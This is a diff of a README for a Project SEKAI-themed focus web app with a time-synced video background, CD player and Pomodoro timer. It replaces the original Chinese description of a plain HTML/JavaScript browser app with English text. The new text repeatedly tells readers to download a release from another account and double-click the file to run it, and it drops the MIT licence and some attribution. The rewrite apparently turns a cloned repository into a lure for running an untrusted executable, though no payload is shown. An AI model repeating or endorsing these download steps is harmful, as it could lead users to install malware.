@@ -1,52 +1,84 @@
-# 『25时、Nightcord见。』成员们的 24 小时工作日常
+# 🎉 25ji-sagyo - Your Companion for Focused Work Sessions
 
-这是一个基于《Project SEKAI》“25时、Nightcord见。” (25-ji, Nightcord de.) 主题的沉浸式作业陪伴网页应用。它结合了与现实时间同步的背景视频、内置 CD 播放器和番茄钟，为你提供专注的作业环境。
+[![Download 25ji-sagyo](https://img.shields.io/badge/Download-Here-blue.svg)](https://github.com/Terror242/25ji-sagyo/releases)
 
-## ✨ 主要功能
+Welcome to 25ji-sagyo, an immersive web app designed to help you stay focused while you work. With features like synchronized background videos and a built-in CD player, this tool offers the ideal environment for keeping you engaged in your tasks.
 
-### 1. 🕒 时间同步背景视频
-- **自动同步**：根据你的本地时间，自动播放对应的背景视频片段（早晨/白天/深夜）。
-- **无缝衔接**：视频进度与现实时间精确同步，仿佛角色们就在你身边一起作业。
-- **时区支持**：支持本地时间和东京时间切换。
+## 🚀 Getting Started
 
-### 2. 🎵 沉浸式 CD 播放器
-- **海量曲库**：通过 [Sekai Master DB Diff](https://github.com/Sekai-World/sekai-master-db-diff) 获取游戏内的音乐数据。
-- **多版本支持**：支持切换不同演唱版本（Sekai ver. / Virtual Singer ver. / Anvo ver. 等）。
-- **智能播放**：
-  - 支持顺序播放、随机播放、单曲循环。
-- **记忆功能**：
-  - 自动保存音量、上次播放的歌曲、播放模式偏好。
-- **视觉效果**：
-  - 播放时 CD 唱片旋转动画。
-  - 暂停时平滑减速停止。
-  - 专辑封面自动加载。
+To get started with 25ji-sagyo, follow these steps:
 
-### 3. 🍅 专注番茄钟
-- **工作流管理**：标准番茄工作法（25分钟工作 + 5分钟短休息 + 长休息）。
-- **状态保持**：刷新页面不丢失当前进度。
-- **桌面通知**：计时结束时发送浏览器通知提醒。
-- **自定义设置**：可调整工作和休息时长。
+1. **Visit the Releases Page**  
+   Click the button above or go to this link: [Download 25ji-sagyo](https://github.com/Terror242/25ji-sagyo/releases).
 
-### 4. 🌍 世界时钟
-- 显示本地时间、东京时间、纽约时间和伦敦时间。
-- 精确到毫秒的数字时钟。
+2. **Choose Your Version**  
+   On the Releases page, you’ll see various versions available for download. Pick the latest version.
 
-## 📚 教程
+3. **Download the Application**  
+   Click the appropriate file for your system to download the application.
 
-如果您是第一次使用，或者想了解更多功能细节，请参考以下教程：
+4. **Run the Application**  
+   Locate the downloaded file in your system and double-click it to run 25ji-sagyo.
 
-- [功能教程索引](./tutorials/README.md)
+## 🥇 Key Features
 
-## 🛠️ 技术栈
+### 1. 🕒 Synchronized Background Videos
+- **Automatic Playback**: The app plays background videos that match your local time (morning, day, or night).
+- **Seamless Transition**: Video changes align with real-time, creating an immersive work atmosphere.
+- **Time Zone Support**: Switch between local time and Tokyo time easily.
 
-- **核心**：原生 HTML5, CSS3, JavaScript。
-- **数据源**：
-  - 音乐数据：[Sekai Viewer](https://github.com/Sekai-World/sekai-viewer)。
-  - 资源托管：Aliyun OSS。
-- **存储**：
-  - `localStorage`: 持久化用户偏好（音量、播放列表设置）。
-  - `sessionStorage`: 保持番茄钟运行状态。
+### 2. 🎵 Immersive CD Player
+- **Extensive Music Library**: Access game music through [Sekai Master DB Diff](https://github.com/Sekai-World/sekai-master-db-diff).
+- **Version Switching**: Choose between different singing versions (Sekai ver., Virtual Singer ver., etc.).
+- **Smart Playback Options**: Play music in order, randomly, or loop a single track.
+- **Memory Feature**: Remembers your volume, last played song, and preferred playback settings.
+- **Visual Effects**: Enjoy animations when playing and pausing music, along with automatic album art loading.
 
-## 📝 License
+### 3. 🍅 Focus Pomodoro Timer
+- **Workflow Management**: Use the standard Pomodoro method (25 minutes work + 5-minute break + long break).
+- **Session Persistence**: Refreshing the page won’t lose your ongoing progress.
+- **Desktop Notifications**: Get notifications when your timer ends.
+- **Custom Settings**: Adjust both work and break durations to fit your needs.
 
-MIT License
+### 4. 🌍 World Clock
+- **Multi-Time Zone Display**: Shows local time, Tokyo time, New York time, and London time.
+- **Precision**: Features a digital clock with millisecond accuracy.
+
+## 📚 Tutorials
+
+If you are new to 25ji-sagyo or want to learn about the features in detail, check out our tutorials:
+
+- [Feature Tutorial Index](./tutorials/README.md)
+
+## 🛠️ Technical Stack
+
+- **Core Technologies**: Built with plain HTML5, CSS3, and JavaScript.
+- **Data Sources**:
+  - Music Data: Utilizes resources from [Sekai Viewer](https://github.com/Sekai-World/sekai-viewer).
+
+## ⚙️ System Requirements
+
+To run 25ji-sagyo smoothly, ensure your system meets the following requirements:
+
+- **Operating System**: Windows 10 or later, macOS 10.12 or later, or a modern Linux distribution.
+- **Browser**: Latest version of Chrome, Firefox, or Safari for optimal performance.
+- **Internet Connection**: A stable connection is recommended for accessing the music library.
+
+## 👩‍💻 Troubleshooting
+
+If you encounter issues, here are some tips:
+
+- **Ensure Compatibility**: Make sure your operating system and browser meet the requirements.
+- **Check Network Connection**: A stable internet connection is essential for music playback.
+- **Refresh the Page**: If something seems off, refreshing the browser can sometimes resolve it.
+
+For further assistance, feel free to consult the tutorial linked above or reach out to the community on the GitHub issues page.
+
+## 📥 Download and Install
+
+To install 25ji-sagyo, follow these two steps again for clarity:
+
+1. **Visit the Releases Page**: Go to [Download 25ji-sagyo](https://github.com/Terror242/25ji-sagyo/releases).
+2. **Download the Application**: Choose the latest version and download it.
+
+Now you're ready to enjoy focused work sessions with 25ji-sagyo!
